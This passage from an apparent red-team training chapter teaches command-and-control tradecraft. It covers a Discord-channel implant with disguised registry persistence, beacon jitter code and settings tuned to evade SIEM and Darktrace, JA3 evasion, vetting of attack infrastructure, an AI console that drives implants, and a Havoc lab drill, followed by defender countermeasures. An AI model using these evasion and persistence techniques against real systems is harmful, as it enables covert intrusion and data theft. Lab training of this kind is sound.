                         │   │  Registered: HKCU\Run         │    │
                         │   └──────────────────────────────┘    │
                         │                                        │
                         │   ┌──────────────────────────────┐    │
                         │   │  svchost_update.exe  (Python) │    │
                         │   │  Full interactive implant     │    │
                         │   │  Commands: SCREENSHOT, UPLOAD, │   │
                         │   │  DOWNLOAD, RECON, shell cmds  │    │
                         │   │  Transport: Discord bot API   │    │
                         │   └──────────────────────────────┘    │
                         │                                        │
                         │   ┌──────────────────────────────┐    │
                         │   │  Cloak DLL (CBT hook)        │    │
                         │   │  Hides process names and     │    │
                         │   │  ports from GUI apps          │    │
                         │   └──────────────────────────────┘    │
                         └────────────────────────────────────────┘

WHAT EACH HOP HIDES FROM DEFENDERS:

  TCP beacon (svchost_health.exe):
    → hides behind a svchost-style process name
    → connects to internal operator IP — no external traffic if both on LAN
    → Cloak DLL hides it from Task Manager, netstat GUI

  Discord implant (svchost_update.exe):
    → all traffic to discord.com — trusted domain, categorised, TLS
    → operator never needs to expose a listening port externally
    → commands appear as chat messages — no C2 protocol fingerprint
    → file exfil via Discord attachment upload (<8MB) — looks like sharing files

  cheyanne_agent.py (AI operator console):
    → operator talks to an AI that translates intent to implant commands
    → AI knows CHEYANNE API (get_sessions, send_command, poll_output)
    → reduces operator skill floor — describe the goal, AI picks the tool

PERSISTENCE MECHANISM:
  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  Key: WindowsSecurityHealth
  Value: C:\Users\george\AppData\Local\Temp\svchost_health.exe
  → runs on every user login, no admin required
  → blends with legitimate Windows health service names
```

### Hop-by-Hop Analysis

**Hop 1 — Target to Discord**: `svchost_update.exe` authenticates to Discord using a bot
token, joins the operator's private guild, and polls the C2 channel using Discord's
gateway websocket. Every message appears as a legitimate Discord chat message. The only
network traffic the target generates is HTTPS to `gateway.discord.gg` — indistinguishable
from a human using Discord.

**Hop 2 — Discord to Operator**: The operator types commands directly into a Discord channel
from any device — phone, browser, desktop. No VPN required. No exposed listener port.
Discord acts as the message broker. Commands persist in the channel even if the operator
disconnects.

**Hop 3 — Operator Console to AI**: `cheyanne_agent.py` wraps the implant API in an AI
conversation. The operator describes what they want ("take a screenshot and browse the
desktop") and the AI calls `screenshot()` then `browse_files("C:\\Users\\Ghaleb\\Desktop")`.
This is CHEYANNE in the 22DIV configuration: Discord-channel C2 with AI-assisted operation.

// DRILL: Draw this architecture from memory on paper. Label every hop. For each hop, write one sentence describing what a network defender sees and why it is or isn't suspicious.

---

## Beacon Interval Jitter — Why It Matters

**WHAT IT IS**: Jitter is deliberate randomisation of the time between beacon callbacks.
Instead of firing every exactly 30 seconds, the beacon fires at 30 ± some random amount.
The randomisation window is expressed as a percentage of the base interval.

**WHY IT MATTERS**: IDS/EDR systems and SIEM platforms profile network behaviour over time.
Modern detection engines (Darktrace, Elastic SIEM ML, Zeek beacon detection scripts) all
implement time-series analysis of connection patterns. Their detection logic is simple
and brutally effective:

```
BEACON DETECTION ALGORITHM (simplified — what Zeek and Darktrace run):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For each (source_ip, destination_ip) pair in NetFlow logs:
  1. Extract timestamps of all connection events
  2. Calculate inter-connection intervals (delta_t between each pair)
  3. Calculate mean and standard deviation of those intervals
  4. Score = 1.0 - (stddev / mean)
     If score > 0.85: flag as potential beacon

INTERPRETATION:
  Perfect 30s beacon:
    intervals = [30, 30, 30, 30, 30, 30]
    mean = 30, stddev ≈ 0
    score = 1.0 - (0 / 30) = 1.0  ← FLAGGED IMMEDIATELY

  10% jitter (±3s):
    intervals = [28, 32, 29, 31, 27, 33]
    mean = 30, stddev ≈ 2.2
    score = 1.0 - (2.2 / 30) = 0.927  ← STILL FLAGGED

  40% jitter (±12s):
    intervals = [18, 42, 25, 38, 21, 35]
    mean = 29.8, stddev ≈ 9.2
    score = 1.0 - (9.2 / 29.8) = 0.691  ← Below most alert thresholds

  50% jitter with longer base (60s ± 30s):
    intervals = [41, 78, 55, 89, 34, 62]
    mean ≈ 60, stddev ≈ 20
    score = 1.0 - (20 / 60) = 0.667  ← Looks like normal browse traffic
```

The formula in your C beacon:

```c
/*
 * jitter_sleep — the math behind beacon interval randomisation
 *
 * FORMULA:
 *   jitter_range = base_sec * (jitter_pct / 100.0)
 *   offset       = random float in [-jitter_range, +jitter_range]
 *   actual_sleep = base_sec + offset
 *
 * EXAMPLE — base=30, jitter=40%:
 *   jitter_range = 30 * 0.40 = 12 seconds
 *   offset       = random in [-12, +12]   ← rand() normalized to [-range, +range]
 *   actual_sleep = 30 + offset             ← anywhere from 18s to 42s
 *
 * WHY rand() NOT time(NULL):
 *   time(NULL) changes every second — predictable.
 *   rand() seeded with time(NULL) gives pseudo-random values per-call.
 *   For stronger randomness, use CryptGenRandom() on Windows (overkill here).
 */
void jitter_sleep(int base_sec, int jitter_pct) {
    /*
     * (double)rand() / RAND_MAX
     *   → float in [0.0, 1.0]
     * * 2.0 * range
     *   → float in [0.0, 2*range]
     * - range
     *   → float in [-range, +range]
     */
    double range  = base_sec * (jitter_pct / 100.0);
    double offset = ((double)rand() / RAND_MAX) * 2.0 * range - range;
    int    actual = (int)(base_sec + offset);
    if (actual < 1) actual = 1;              /* never sleep less than 1s */
    Sleep(actual * 1000);                    /* Win32 Sleep() takes ms */
}
```

### Jitter Parameter Selection Guide

```
ENVIRONMENT          BASE SLEEP    JITTER    REASONING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No monitoring         5s           10%       Speed > stealth — get in, get out
Light monitoring     30s           30%       Breaks simple IDS rules
Corporate SIEM       60s           40%       Harder for ML beacon detection
SOC with Darktrace  120s           50%       Maximum evasion vs behavioural AI
Air-gapped / SMB      5s            5%       Internal only — no pattern analysis
```

### What Jitter Doesn't Fix

Jitter randomises timing. It does not fix:
- **Consistent source/destination pair** — if the same workstation always connects
  to the same CDN IP, that's still anomalous even with random timing
- **Session length** — short connect/disconnect cycles look different from sustained
  HTTPS browsing sessions (which maintain TLS sessions for minutes)
- **Data volume** — a beacon sending 200 bytes every cycle has a different profile
  than a user browsing websites (which transfers kilobytes)
- **Business hours** — a beacon connecting at 2:47AM when no one is in the office
  is anomalous regardless of timing jitter

Fix these by: rotating destination IPs (redirectors with DNS TTL), varying payload sizes
(random padding in POST data), and matching beacon activity to target organisation's
working hours.

// DRILL: Write a Python script that generates 100 jittered intervals using base=30, jitter=40. Calculate mean and standard deviation. Compute the beacon score (1 - stddev/mean). Confirm it's below 0.85. Then plot the intervals with matplotlib and visually confirm they look random.

---

## Section 6 — C2 Detection Methods

Know what the defenders are looking for. Build your C2 to not look like that.

### JA3 / JA3S Fingerprinting

JA3 is an algorithm that fingerprints TLS clients (and servers) based
on TLS handshake parameters. Every TLS library has a distinct JA3 hash.
Many C2 frameworks have known JA3 hashes.

```
JA3 CALCULATION (simplified):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

JA3 hashes: TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats
Example: 769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0
MD5 of that string = JA3 hash

KNOWN MALICIOUS JA3 HASHES (partial list):
  a0e9f5d64349fb13191bc781f81f42e1  → Metasploit Meterpreter
  72a589da586844d7f0818ce684948eea  → Cobalt Strike default
  b386946a5a44d1ddcc843bc75336dfce  → Cobalt Strike malleable profile (some)

DEFENDERS USE JA3 TO:
  - Block connections from known-bad TLS fingerprints at the firewall
  - Alert on matching fingerprints in network traffic
  - Attribute traffic to specific tooling

YOUR RESPONSE:
  1. Use a realistic JA3 — compile your agent using the same TLS library
     as the software you're mimicking (Chrome uses BoringSSL → match its JA3)
  2. Or: use a framework that supports JA3 randomisation
  3. Check your JA3 before deployment:
     # Capture traffic: Wireshark → capture → filter tls.handshake.type == 1
     # Extract JA3: https://github.com/salesforce/ja3
     python ja3.py capture.pcap
     # Compare against known-good browser JA3 hashes
```

### Beacon Interval Analysis

Regular beacon intervals are detectable by UEBA and SIEM tools that
perform time-series analysis on connection patterns.

```
DETECTION LOGIC:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SIEM looks for:
  - Same source IP making requests to same destination at regular intervals
  - Requests with low entropy in timing (consistent ± small variation)
  - Short sessions (connect, small request, disconnect, wait, repeat)
  - Connections outside business hours to external IPs

AUTOMATED BEACON DETECTION TOOLS:
  - Zeek C2 detection scripts
  - Security Onion's beacon detection
  - Elastic SIEM ML detection rules
  - Darktrace behavioural AI

COUNTERMEASURES:
  - High jitter (30-50%) breaks simple interval matching
  - Vary request sizes (add random padding to POST data)
  - Randomise URIs (rotate through a pool of valid-looking URIs)
  - Use long sleep times (60s+ base) — fewer samples for analysis
  - Masquerade traffic timing after business hours ends
    (if target org is 9-5, beacon at 23:00 is suspicious)
```

### Network IOC Hunting

Defenders feed known C2 infrastructure to threat intel feeds and
hunt for these across network logs.

```bash
# Defender hunts:
# Proxy logs → match against ThreatFox/Abuse.ch C2 domains
# DNS logs → match against malware C2 domain feeds
# NetFlow → match against C2 IP reputation feeds

# Your OPSEC response:
# 1. Use fresh infrastructure for each operation
# 2. Check all C2 IPs/domains against major threat intel BEFORE use:
curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=<YOUR_IP>&maxAgeInDays=90" \
     -H "Key: <API_KEY>"

# Check domain:
curl -s "https://urlhaus-api.abuse.ch/v1/host/" \
     -d "host=<YOUR_DOMAIN>"

# VirusTotal IP check:
curl -s "https://www.virustotal.com/api/v3/ip_addresses/<IP>" \
     -H "x-apikey: <API_KEY>"

# If any of these return hits: do NOT use this infrastructure.
# Burn it. Get new IPs. Get new domains. Never operate on flagged infrastructure.
```

---

## DEFENDER TAKEAWAY

You just learned how attackers build C2 infrastructure. Here is what to do with that knowledge on Monday morning to harden your own environment.

- **Block outbound DNS to anything except your internal DNS server.** DNS C2 only works if the compromised host can reach an attacker-controlled DNS server. On Windows Firewall, block UDP/TCP port 53 from workstations to all destinations except your internal DNS resolvers. Attackers then lose their DNS C2 channel entirely.

- **Enable DNS query logging and alert on anomalies.** In Windows DNS Server, enable debug logging (DNS Manager → your server → Properties → Debug Logging). Feed logs to your SIEM. Alert on: unusually long subdomain labels (>30 chars), high query rate to a single domain (>50 queries/min), queries to domains registered in the last 30 days. Tools: Windows DNS Analytical log, or forward to Elastic/Splunk and apply beacon-detection rules.

- **Hunt for periodic beacon patterns in your proxy logs.** Export 24 hours of HTTPS proxy logs. Group by source-IP + destination-hostname. Any pair with more than 20 connections and a standard deviation of connection intervals under 15 seconds is a candidate beacon. Free tool: RITA (Real Intelligence Threat Analytics) does this automatically — https://github.com/activecm/rita.

- **Block uncategorised and newly-registered domains at your web proxy.** Every enterprise-grade proxy (Zscaler, Palo Alto, Cisco Umbrella) can block connections to uncategorised URLs and domains registered under 30 days old. Enable both policies. Legitimate business traffic almost never needs to reach a brand-new uncategorised domain. This kills a large portion of C2 infrastructure selection strategies described in this chapter.

- **Windows Event ID 5156 — log outbound connections.** Enable Windows Firewall auditing via Group Policy: Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy → Object Access → Audit Filtering Platform Connection → Success. Event ID 5156 logs every allowed outbound connection with process name, destination IP, and port. Use this to detect implants making repetitive outbound connections to the same external IP.

- **Windows Event ID 7045 — alert on new service installs.** Persistence often creates services. Every new service installation generates Event ID 7045 in the System log. Alert on any new service whose binary path points to a temp folder (`%TEMP%`, `%APPDATA%`, `C:\Users\*\AppData\`) — that is not normal. Legitimate software installs to `Program Files`.

- **Name-pipe monitoring for SMB C2.** Run Sysmon (free, from Sysinternals) and enable Event ID 17 (Pipe Created) and Event ID 18 (Pipe Connected). Alert on named pipes being created by processes that have no business creating them (e.g., `svchost.exe` creating a pipe named `MSSE-1234-server` or any random alphanumeric string). Legitimate named pipes follow consistent naming conventions.

- **JA3 fingerprint blocking at your firewall/IDS.** Snort, Suricata, and most NGFWs support JA3 hash matching. Import the known-bad JA3 hash list from https://github.com/trisulnsm/trisul-scripts/tree/master/lua/frontend_scripts/reassembly/ja3 and block or alert on matches. This catches default Metasploit and Cobalt Strike traffic even when it uses legitimate-looking URIs.

- **Discord C2 detection.** Block or monitor chat applications on corporate workstations. If Discord must be allowed, monitor for bot token authentication patterns (Discord bot user IDs always start with a specific range, and bot tokens have a recognisable base64 structure). Alert on Discord connections from server machines (not workstations) — no one runs Discord on a web server.

---

## Key Terms (Add to Glossary)

| Term | Definition |
|------|-----------|
| **C2 (Command and Control)** | Infrastructure and protocol enabling operator communication with implants on compromised hosts |
| **Team server** | Backend C2 server managing operator sessions, payload generation, and agent communications |
| **Listener** | Network service accepting agent callbacks; protocol-specific (HTTP, DNS, SMB, TCP) |
| **Redirector** | Proxy layer sitting between agents and team server; absorbs exposure when infrastructure burns |
| **Beacon** | The periodic callback action of an agent; also used to refer to Cobalt Strike's agent |
| **Staged implant** | Two-part delivery: small stager downloads the full agent from C2 at runtime |
| **Stageless implant** | Full agent embedded in the initial payload; single delivery, no stage fetch required |
| **Malleable C2 profile** | Configuration defining exact appearance of beacon traffic (headers, URIs, encoding, timing) |
| **Sleep jitter** | Random variation applied to beacon intervals; defeats time-series detection |
| **JA3** | TLS fingerprinting algorithm based on ClientHello parameters; used to fingerprint C2 tools |
| **DNS C2** | Tunnelling C2 communications through DNS queries/responses; bypasses most firewalls |
| **SMB named pipe** | Windows IPC mechanism; used for peer-to-peer C2 inside network segments with no internet |
| **Kill date** | Hardcoded date in implant after which it terminates; limits operational exposure |
| **Domain categorisation** | Web proxy URL classification; C2 domains must be pre-categorised to avoid block |
| **BOF** | Beacon Object File; small position-independent code executed in-process by Cobalt Strike/Havoc |
| **MinGW-w64** | GNU compiler toolchain for Windows; used to compile C implant code on Windows via MSYS2 |
| **kernel32.dll** | Core Windows DLL providing process/thread/memory APIs including ExitProcess(); always link with -lkernel32 |
| **ntdll.dll** | Lowest-level Windows DLL exposing native NT syscalls; implicitly linked but used directly for syscall bypasses |
| **WSAStartup** | Windows Sockets initialisation function; must be called before any socket operations |
| **CreateProcess** | Win32 API for spawning processes with custom stdin/stdout/stderr handles; used for pipe-captured command execution |
| **ws2_32.dll** | Windows Sockets DLL; link with -lws2_32 for all Winsock functions (socket, connect, send, recv) |
| **Discord C2** | Using Discord bot API as covert C2 transport; traffic blends with legitimate Discord usage on port 443 |
| **Beacon score** | Metric (1 - stddev/mean) quantifying how periodic a connection pattern is; >0.85 = strong beacon signal |

---

## Drill 16 — Command & Control

Go to `DRILLS/16_c2/`. A Havoc C2 team server is pre-configured in
a contained lab environment. A Windows 10 victim VM is connected.

Your mission:

1. **Configure the listener**.
   - Set up an HTTPS listener with a malleable profile that mimics
     Cloudflare traffic (`/cdn-cgi/trace` endpoint pattern).
   - Set sleep time 45s, jitter 30%.
   - Verify the listener is running.

2. **Generate and deliver a stageless implant**.
   - Generate a stageless HTTPS Demon agent for the listener.
   - Deliver it to the victim VM (file share, drop to temp folder).
   - Execute it. Confirm check-in in the team server console.

3. **Beacon traffic analysis**.
   - Run Wireshark on the victim VM capturing to the C2 interface.
   - Let the beacon fire 5 times.
   - Export the capture.
   - Measure actual sleep intervals — confirm jitter is working.
   - Extract JA3 hash from the TLS handshake.
   - Check the JA3 hash against known signatures — is it flagged?

4. **Profile customisation**.
   - Modify the malleable profile to change the URI to a pattern
     mimicking Microsoft Telemetry traffic.
   - Change the User-Agent to match Edge on Windows 11.
   - Redeploy and confirm traffic matches the new profile.

5. **Redirector setup**.
   - Deploy socat on a second VM as a redirector.
   - Reconfigure the implant to hit the redirector, not the team server.
   - Confirm C2 still works through the redirector.
   - What IP does the implant's network connection show?
     Does the team server IP appear anywhere in the connection?

6. **Kill date implementation**.
   - Implement a kill date check in a custom C2 stub (sample code provided).
   - Set the kill date to 7 days from now.
   - Compile with `gcc -o kill_stub.exe kill_stub.c -lkernel32` (MinGW-w64 in MSYS2).
   - Advance the system clock past the kill date.
   - Verify the agent terminates silently.

7. **Build the C beacon and Python listener — full integration**.
   - Compile `beacon.c` with `x86_64-w64-mingw32-gcc beacon.c -o beacon.exe -lws2_32`.
   - Start `operator_listener.py` on your machine.
   - Run `beacon.exe` on the target (or localhost for the drill).
   - Confirm heartbeat JSON arrives at the listener.
   - Select the agent. Send `whoami`. Confirm output returns.
   - Send `ipconfig`. Confirm network configuration returns.
   - Observe beacon reconnection intervals — confirm jitter is active.
   - Kill the listener. Watch beacon retry silently. Restart listener. Confirm reconnect.

// DRILL: Build the C beacon and Python listener, connect on localhost, send whoami, receive output. Then modify SLEEP_BASE to 10 and SLEEP_JITTER to 50. Run for 2 minutes. Record 12 intervals. Calculate mean and stddev. Compute beacon score. Does it fall below 0.85?

The infrastructure is half the operation. Build it like you're
going to live in it for six months. Because sometimes you will.

---

— The BEACON fires JITTER-masked through the watched wire —
dark traffic, clean CDN, operator waits with the cursor ready

